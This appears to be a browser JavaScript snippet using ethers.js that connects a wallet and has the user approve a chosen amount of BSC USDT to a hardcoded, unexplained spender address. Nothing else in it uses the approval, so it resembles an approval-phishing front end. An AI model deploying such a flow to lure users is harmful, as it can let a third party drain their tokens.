let provider;
let signer;
let usdtContract;

// ===== CONFIG =====
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

// ===== CONNECT WALLET =====
async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    return;
  }

  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);

    signer = await provider.getSigner();
    usdtContract = new ethers.Contract(
      USDT_ADDRESS,
      ERC20_ABI,
      signer
    );

    const address = await signer.getAddress();
    document.getElementById("status").innerText =
      "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
  } catch (err) {
    document.getElementById("status").innerText = "Connection failed";
  }
}

// ===== APPROVE =====
async function approveUSDT() {
  try {
    if (!usdtContract) {
      await connectWallet();
    }

    const amountInput = document.getElementById("amount").value;
    if (!amountInput || Number(amountInput) <= 0) {
      alert("Enter valid amount");
      return;
    }

    const decimals = await usdtContract.decimals();
    const amount = ethers.parseUnits(amountInput.toString(), decimals);

    document.getElementById("status").innerText =
      "Check your wallet for approval…";

    const tx = await usdtContract.approve(SPENDER_ADDRESS, amount);
    await tx.wait();

    document.getElementById("status").innerText =
      "Approval successful ✔";
  } catch (err) {
    document.getElementById("status").innerText =
      "Approval cancelled";
  }
}
